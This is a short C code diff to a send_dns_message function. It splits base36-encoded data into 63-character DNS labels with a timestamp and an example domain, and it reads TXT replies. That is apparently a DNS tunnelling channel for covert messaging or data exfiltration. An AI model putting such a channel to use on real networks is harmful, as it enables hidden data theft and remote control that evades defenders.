@@ -763,15 +763,39 @@ static int send_dns_message(const char *message, const char *target_domain, char
         return -1;
     }
     
+    // Split encoded string into DNS labels (max 63 chars per label)
+    // DNS query format: <label1>.<label2>.<timestamp>.<domain> (4 labels total)
+    // We can use maximum 2 labels for base36 data (126 chars max)
+    // Example: aiihbk2levr6d2jmb5dve5vfqqyg2oah3neijqkiswoj89pw.1762372821.secwolf.net (3 labels)
+    // Example: 71v92tj2ch04qd3mf5xqa35wsl2hl4rhwt8jzaogdby29k40dx87m15a.34lfco5q3sge90lwpz26yba.1762372821.secwolf.net (4 labels)
+    char split_domain[1024];
+    size_t encoded_len = strlen(encoded);
+    const size_t MAX_LABEL_LEN = 63;
+    
+    if (encoded_len <= MAX_LABEL_LEN) {
+        // Fits in one label: <data>.<timestamp>.<domain>
+        snprintf(split_domain, sizeof(split_domain), "%s", encoded);
+    } else if (encoded_len <= MAX_LABEL_LEN * 2) {
+        // Split into 2 labels: <data1>.<data2>.<timestamp>.<domain>
+        char label1[MAX_LABEL_LEN + 1];
+        strncpy(label1, encoded, MAX_LABEL_LEN);
+        label1[MAX_LABEL_LEN] = '\0';
+        snprintf(split_domain, sizeof(split_domain), "%s.%s", label1, encoded + MAX_LABEL_LEN);
+    } else {
+        // ERROR: Encoded message too long (>126 chars)
+        fprintf(stderr, "[DIAG] ERROR: Encoded message too long (%zu chars, max 126)!\n", encoded_len);
+        return -1;
+    }
+    
     // Retry mechanism with delays
     for (int attempt = 0; attempt < MAX_RETRIES; attempt++) {
     DEBUG_PRINT("[*] DNS query attempt %d/%d to %s\n", attempt + 1, MAX_RETRIES, target_domain);
         
         // Generate fresh timestamp for each attempt (cache busting + unique per retry)
         snprintf(domain, sizeof(domain), "%s.%lu.%s", 
-                 encoded, (unsigned long)time(NULL), target_domain);
+                 split_domain, (unsigned long)time(NULL), target_domain);
         
-        fprintf(stderr, "[DIAG] Constructed domain: %s\n", domain);
+        fprintf(stderr, "[DIAG] Constructed domain: %s (len=%zu)\n", domain, strlen(domain));
         DEBUG_PRINT("[*] Querying: %s\n", domain);
         
         char txt_response[4096];
